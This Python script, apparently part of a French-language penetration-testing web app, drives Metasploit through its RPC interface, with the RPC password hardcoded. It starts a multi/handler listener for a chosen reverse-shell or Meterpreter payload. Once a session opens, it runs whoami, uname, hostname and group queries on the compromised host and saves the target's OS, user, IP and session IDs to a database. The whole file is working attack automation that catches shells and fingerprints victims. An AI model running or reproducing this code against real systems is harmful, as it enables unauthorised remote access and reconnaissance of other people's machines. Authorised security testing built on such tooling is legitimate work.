from pymetasploit3.msfrpc import MsfRpcClient
import argparse
import json
import sqlite3
import time
import re
from datetime import datetime
import yaml

# Créer un objet ArgumentParser
parser = argparse.ArgumentParser()

# Ajouter les arguments attendus

#parser.add_argument('--exploit', type=str, required=True, help='exploit name')
#parser.add_argument('--Raddress', type=str, required=True, help='address cible')
parser.add_argument('--payload', type=str, required=True, help='charge utile')
parser.add_argument('--activity_id', type=str, required=True, help='activity id')
parser.add_argument('--port', type=str, required=True, help='port to listen')

args = parser.parse_args()

# Lecture du fichier de configuration:
with open("My_app/config.yml", 'r') as file:
    yaml_data = yaml.safe_load(file)

# Se connecter au serveur Metasploit
client = MsfRpcClient('anis', ssl=True)


#Parametrage de l'exploitation
exploit = client.modules.use('exploit', 'multi/handler')
payload = client.modules.use('payload', args.payload)

if "LHOST" in payload.missing_required:
    payload["LHOST"] = yaml_data["local_host"]
    payload["LPORT"] = args.port

# Se connecter a la base de données

conn = sqlite3.connect("db.sqlite3")
c = conn.cursor()

# obtenir l'id de l'activite sur laquel on va enregistrer le resultat :
activity_id = int(args.activity_id)

# Mettre a jour le end_date dans la base de données de l'activité
activities = c.execute("update My_app_activity set end_date = ? where id = ?", (datetime.now(), activity_id))

# commit les changements :
conn.commit()

# écouter le port
cid = client.consoles.console().cid # Create a new console and store its number in 'cid'
listener_output = client.consoles.console(cid).run_module_with_output(exploit, payload=payload)
print(listener_output)
time.sleep(3)

# calculer le nombre de sessions
count_sessions = len(list(client.sessions.list.keys()))

# Recuperer l'uuid de la session
my_session_id = 0
if count_sessions > 0:
    my_session_id = list(client.sessions.list.keys())[-1]

# Verifier si l'xploit a marcher
#shell_chain = "Session " + str(my_session_id) + " created"
#meterpreter_chain = "Meterpreter session " + str(my_session_id)

resultat = {}

if re.search(r"Meterpreter session \d+ opened", listener_output) or re.search(r"Command shell session \d+ opened", listener_output):
    # l'exploit a marché :
    print("exploit reussi")

    #on recupere l'uudi de la session :
    meterpreter = False
    my_session_uuid = None
    for session_id, session_info in client.sessions.list.items():
        if session_id == my_session_id:
            my_session_uuid = session_info["uuid"]
            if session_info["type"] == "meterpreter":
                meterpreter = True
            break

    shell = client.sessions.session(my_session_uuid)
    if meterpreter == True:
        shell.write("shell")
        time.sleep(4)
        shell.read()

    # Obtenir des info sur la session pour l'enregistrer
    shell.write("whoami")
    time.sleep(2)
    whoami_output = shell.read()

    shell.write("uname -a")
    uname_output = shell.read()

    shell.write("hostname")
    time.sleep(1)
    hostname_output = shell.read()

    # determination de l'user et de l'os
    session_user = None
    session_os = None
    if "Linux" in uname_output:
        session_os = "linux"
    elif "Darwin" in uname_output:
        session_os = "macos"
    else:
        session_os = "windows"

    if session_os == "linux" or session_os == "macos":
        session_user = whoami_output
    else:
        match = re.search(r'(?<=whoami\n).*(?=\r)', whoami_output)
        if match:
            session_user = match.group()
        else:
            print("Le contenu spécifié n'a pas été trouvé.")

    # Determination des groups:
    user_groups = None
    if session_os == "windows":
        shell.write("whoami /groups")
        user_groups = shell.read()
    else:
        shell.write("groups")
        user_groups = shell.read()

    if meterpreter == True:
        shell.write("exit")
        shell.read()

    print("l'uuid de ma session" + str(my_session_id) + " est: " + str(my_session_uuid))
    

    # recuperer l'address ip cible 
    match = re.search(r'\->\s*(\d+\.\d+\.\d+\.\d+):', listener_output)
    target_address = match.group(1)
    success = True
    resultat["session_os"] = session_os
    resultat["hostname"] = hostname_output
    resultat["session_user"] = session_user
    resultat["user_groups"] = user_groups
    resultat["session_id"] = my_session_id
    resultat["session_uuid"] = my_session_uuid
    resultat["status"] = success
    resultat["target_ip"] = target_address
    resultat["target_port"] = args.port
    if meterpreter == True:
        resultat["payload_type"] = "meterpreter"
    else:
        resultat["payload_type"] = "not_meterpreter"

else:
    success = False
    resultat["status"] = success


print(resultat)
# Transformer le dictionnaire en JSON :
json_resultats = json.dumps(resultat)

activities = c.execute("update My_app_activity set results = ? where id = ?", (json_resultats, activity_id))

# commit les changements :
conn.commit()

# close database connection :
conn.close()

